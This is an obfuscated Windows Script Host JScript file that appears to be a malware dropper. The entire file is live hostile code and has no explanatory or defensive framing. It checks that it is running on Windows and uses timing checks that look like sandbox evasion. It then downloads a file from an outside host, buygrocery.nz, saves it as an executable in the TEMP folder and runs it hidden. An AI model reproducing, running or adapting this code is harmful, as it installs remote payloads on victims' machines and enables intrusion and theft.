var CA = false;
var YH = "Create"+"Object";
var F = function GY() {return WScript[YH]("WScript"+".Shell");}(), A0 = 11;
var H = "MSXML2"+".XMLHTTP";
var M = 2;
var YM = M - 2;
function K0(D){F["Run"](D, YM, YM);};
function N(){return H + "";};
function GT(DC, NH){YM = YM * 1; return DC - NH;};
function I(){return YH;};
/*@cc_on
  @if (@_win32 || @_win64)
    CA = true;
  @end
@*/
if (CA)
{
var QJ = "";
function ON(){return 22;};
var Z = 0; var S = 0;
function WI()
{
var O = new this["Date"]();
var W = O["getUTCMilliseconds"]();
WScript["Sleep"](ON());
var O = new this["Date"]();
var N0 = O["getUTCMilliseconds"]();
WScript["Sleep"](ON());
var O = new this["Date"]();
var FG = O["getUTCMilliseconds"]();
var Z = "J";
Z = GT(N0, W);
var S = "A";
S = GT(FG, N0);
QJ = "open";
return GT(Z, S);
}
var B = false;
var A1 = false;
for (var SQ = YM; SQ < ON() * 1; SQ++){if (WI() != YM){
B = true; 
S = "31" + 11 * Z + S; 
A1 = true; 
break;
}}
function K() {return ((B == true) && (B == A1)) ? 1 : YM;};
if (B && K() && A1){
function AD() {return F["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "iMQLMo1sO0.ex" + "e";};
 JN = N();
 RH = WScript[YH](JN);
 var PW = 1;
do { 
	for (;PW;){
	try {
		if (PW == 1)
		{
			RH[QJ]("GET", "http://buygrocery.nz/l7dsp", false);
			RH["send"]();
			QE = "Sleep";
			PW = 2;
		}
		WScript[QE](ON() + 120); 
		if (RH["readystate"] < 2 * 2) continue;
		PW = YM;
		function U(XK) {var PS = (1, 2, 3, 4, 5, XK); return PS;};
		X = WScript[I()]("ADODB.Stream");
		JN = X;
		JN[QJ]();
		JN["type"] = U(1);
		JN["write"](RH["ResponseBody"]);
		X["position"] = U(YM);
		JN["Save" + "ToFile"](AD(), 2);
		X["cl"+"ose"]();
		UG = AD();
		K0(UG);
	} catch(LX){};};
}while (PW);
}
}

